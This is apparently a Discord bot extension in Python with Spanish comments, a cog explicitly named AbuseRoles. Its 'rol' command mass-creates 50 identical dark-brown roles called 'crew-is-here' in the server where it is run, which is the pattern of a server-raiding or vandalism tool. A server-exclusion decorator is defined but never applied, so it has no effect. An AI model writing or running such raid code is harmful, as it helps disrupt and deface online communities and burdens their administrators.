from discord.ext import commands
import discord

RESTRICTED_GUILDS = [123456789012345678, 987654321098765432]  # Reemplaza con los IDs de los servidores restringidos

def guild_restriction(restricted_guilds):
    def decorator(func):
        async def wrapper(ctx, *args, **kwargs):
            if ctx.guild.id in restricted_guilds:
                await ctx.send("Este comando no se puede ejecutar en este servidor.")
                return
            return await func(ctx, *args, **kwargs)
        return wrapper
    return decorator

class AbuseRoles(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def rol(self, ctx):
        guild = ctx.guild

        # Definir el color marrón oscuro (hexadecimal)
        dark_brown = discord.Color(0x3B2F2F)

        # Crear 50 roles con el mismo nombre y color
        for _ in range(50):
            try:
                await guild.create_role(name="crew-is-here", color=dark_brown)
                print('Rol "crew-is-here" creado.')
            except discord.Forbidden:
                await ctx.send('No tengo permisos para crear roles en este servidor.')
                return
            except discord.HTTPException as e:
                print(f'Error al crear el rol "crew-is-here": {e}')

        await ctx.send('50 roles "crew-is-here" creados con éxito.')

# Añadir el cog al bot
async def setup(bot):
    await bot.add_cog(AbuseRoles(bot))
